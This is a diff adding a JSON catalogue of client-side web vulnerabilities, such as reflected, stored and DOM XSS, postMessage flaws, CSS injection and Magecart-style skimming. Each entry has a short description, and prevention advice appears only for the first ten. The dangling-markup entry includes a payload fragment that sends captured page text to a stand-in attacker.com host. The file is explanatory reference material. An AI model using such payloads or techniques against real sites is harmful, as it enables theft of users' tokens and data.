@@ -1,0 +1,177 @@
+{
+  "id": "client",
+  "title": "Client-Side",
+  "description": "Vulnerabilities executed within user browsers, compromising DOM environments, storage, cookies, and cross-origin communications.",
+  "icon": "browser",
+  "attacks": [
+    {
+      "name": "Reflected XSS",
+      "notes": "immediate reflection",
+      "desc": "Injecting malicious JavaScript via HTTP request parameters that is immediately reflected by the server into the HTML response without adequate encoding or sanitization.",
+      "prevention": "Encode untrusted output for its HTML context and keep user data out of script execution sinks."
+    },
+    {
+      "name": "Stored XSS",
+      "notes": "persistent script injection",
+      "desc": "Injecting malicious scripts into persistent data stores (databases, comment sections, profiles) that execute whenever other users view the compromised content.",
+      "prevention": "Sanitize any user-authored HTML with a maintained library, then encode it safely when rendered."
+    },
+    {
+      "name": "DOM-based XSS",
+      "notes": "client sink execution",
+      "desc": "Vulnerabilities where an application's client-side JavaScript reads data from a controllable source (location.search, document.referrer) and writes it to an unsafe sink (innerHTML, eval).",
+      "prevention": "Use safe DOM APIs such as textContent and validate URLs before assigning them to browser sinks."
+    },
+    {
+      "name": "Blind XSS",
+      "notes": "backend UI execution",
+      "desc": "Stored XSS payloads that execute in internal administrative or employee dashboards when staff members view user-submitted feedback, tickets, or log viewers.",
+      "prevention": "Review delayed rendering paths such as admin dashboards and notification emails; sanitize stored content before display."
+    },
+    {
+      "name": "Self-XSS",
+      "notes": "social engineering console",
+      "desc": "Tricking a victim into pasting malicious JavaScript code into their browser developer console or into personal account fields only visible to themselves.",
+      "prevention": "Do not treat user-pasted scripts as trusted; restrict powerful actions and make the trust boundary clear to users."
+    },
+    {
+      "name": "mXSS (mutation XSS)",
+      "notes": "HTML sanitizer mutation",
+      "desc": "Exploiting discrepancies between how browser HTML parsers mutate innerHTML and how sanitization libraries inspect markup, resulting in script execution.",
+      "prevention": "Use maintained HTML sanitizers that account for browser mutation and test sanitized content in its final DOM context."
+    },
+    {
+      "name": "XSS via SVG upload",
+      "notes": "embedded <script> in SVG",
+      "desc": "Uploading SVG image files containing embedded <script> tags that execute script in the victim's browser context when viewed directly.",
+      "prevention": "Serve SVG uploads as downloads or sanitize them strictly; prevent active SVG from executing on your origin."
+    },
+    {
+      "name": "XSS via Markdown",
+      "notes": "markdown parser flaws",
+      "desc": "Crafting malicious Markdown syntax containing raw HTML tags or javascript: URI links that bypass poor Markdown rendering sanitizers.",
+      "prevention": "Render Markdown through a maintained parser with HTML disabled or sanitized before insertion."
+    },
+    {
+      "name": "XSS in PDF generation",
+      "notes": "headless browser injection",
+      "desc": "Injecting HTML or JavaScript into server-side headless browsers (wkhtmltopdf, Puppeteer) used for PDF creation, executing code or reading local files via file:// URIs.",
+      "prevention": "Treat user-supplied PDF content as untrusted, patch the renderer, and escape text in generated HTML wrappers."
+    },
+    {
+      "name": "Prototype pollution → XSS",
+      "notes": "polluted DOM gadget",
+      "desc": "Chaining client-side JavaScript prototype pollution with existing script gadgets in popular libraries to achieve Cross-Site Scripting execution.",
+      "prevention": "Reject dangerous object keys and use safe merge routines before polluted data reaches DOM rendering code."
+    },
+    {
+      "name": "Client-side template injection",
+      "notes": "Angular, Vue",
+      "desc": "Injecting template expressions into HTML pages dynamically parsed by front-end frameworks (AngularJS, Vue.js), executing client-side sandbox escapes.",
+      "prevention": null
+    },
+    {
+      "name": "PostMessage misconfiguration",
+      "notes": "missing origin validation",
+      "desc": "Listening to window 'message' events without strictly validating event.origin, allowing rogue websites to transmit malicious payloads to cross-window listeners.",
+      "prevention": null
+    },
+    {
+      "name": "DOM clobbering",
+      "notes": "HTML element overriding variables",
+      "desc": "Injecting HTML elements with crafted id and name attributes that override global JavaScript variables or properties used in application security checks.",
+      "prevention": null
+    },
+    {
+      "name": "Tabnabbing",
+      "notes": "target='_blank' without noopener",
+      "desc": "Exploiting links with target='_blank' lacking rel='noopener noreferrer' to allow the destination page to manipulate window.opener.location and redirect the original tab to a phishing site.",
+      "prevention": null
+    },
+    {
+      "name": "CORS-based data theft",
+      "notes": "cross-origin exfiltration",
+      "desc": "Exploiting overly permissive CORS configurations using malicious JavaScript on a third-party domain to read authenticated responses and sensitive data.",
+      "prevention": null
+    },
+    {
+      "name": "JSONP hijacking",
+      "notes": "callback function theft",
+      "desc": "Exploiting legacy JSONP endpoints that return sensitive data wrapped in client-supplied callback functions, readable cross-origin via dynamic <script> tag inclusion.",
+      "prevention": null
+    },
+    {
+      "name": "CSS injection",
+      "notes": "attribute selector exfiltration",
+      "desc": "Injecting malicious CSS style rules with attribute selectors and background image URLs to exfiltrate sensitive data (such as CSRF tokens) character-by-character.",
+      "prevention": null
+    },
+    {
+      "name": "Scriptless attacks",
+      "notes": "HTML/CSS exfiltration",
+      "desc": "Stealing sensitive page content, form values, and tokens without executing JavaScript by utilizing dangling markup injection, CSS fonts, or standard browser features.",
+      "prevention": null
+    },
+    {
+      "name": "LocalStorage / SessionStorage leak",
+      "notes": "unencrypted web storage",
+      "desc": "Storing sensitive session tokens, JWTs, or encryption keys in browser Web Storage where any client-side XSS vulnerability can trivially read and exfiltrate them.",
+      "prevention": null
+    },
+    {
+      "name": "Service worker hijack",
+      "notes": "persistent network interception",
+      "desc": "Registering a malicious Service Worker script that permanently intercepts all client network requests, modifies API traffic, and steals credentials even after leaving the site.",
+      "prevention": null
+    },
+    {
+      "name": "Missing Subresource Integrity",
+      "notes": "SRI hash omission",
+      "desc": "Loading scripts and stylesheets from third-party CDNs without cryptographic integrity hashes (SRI), allowing compromised CDNs to inject malicious code into the site.",
+      "prevention": null
+    },
+    {
+      "name": "Cross-site script inclusion (XSSI)",
+      "notes": "dynamic script leakage",
+      "desc": "Including sensitive dynamic JavaScript files or JSON arrays from a victim's session across origins using <script> tags to read data via overridden prototype methods.",
+      "prevention": null
+    },
+    {
+      "name": "Dangling markup injection",
+      "notes": "unclosed quotes data exfil",
+      "desc": "Injecting unclosed HTML tags (e.g. <img src='https://attacker.com/log?) into pages where HTML encoding is partially absent to capture all text until the next quote mark.",
+      "prevention": null
+    },
+    {
+      "name": "Autofill data leakage",
+      "notes": "hidden form inputs",
+      "desc": "Placing hidden form inputs on a page that entice browser password and credit card autofill engines to silently populate sensitive saved user credentials.",
+      "prevention": null
+    },
+    {
+      "name": "Browser cache leakage",
+      "notes": "backward/forward cache",
+      "desc": "Sensitive authenticated pages cached by the browser bfcache (back-forward cache) accessible to unauthorized subsequent users of a shared workstation.",
+      "prevention": null
+    },
+    {
+      "name": "WebRTC IP leak",
+      "notes": "STUN candidate IP exposure",
+      "desc": "Utilizing WebRTC STUN requests from JavaScript to uncover a client's true local network IP address and real public IP, bypassing proxy and VPN tunnels.",
+      "prevention": null
+    },
+    {
+      "name": "Clipboard hijacking",
+      "notes": "navigator.clipboard abuse",
+      "desc": "Overwriting or reading the user's system clipboard without explicit consent using JavaScript APIs to replace copied cryptocurrency addresses or execute commands.",
+      "prevention": null
+    },
+    {
+      "name": "Third-party script supply chain",
+      "notes": "Magecart style injection",
+      "desc": "Compromising external marketing, analytics, or customer support scripts loaded by an application to inject credit card skimmers and credential harvesters.",
+      "prevention": null
+    }
+  ],
+  "order": 7
+}
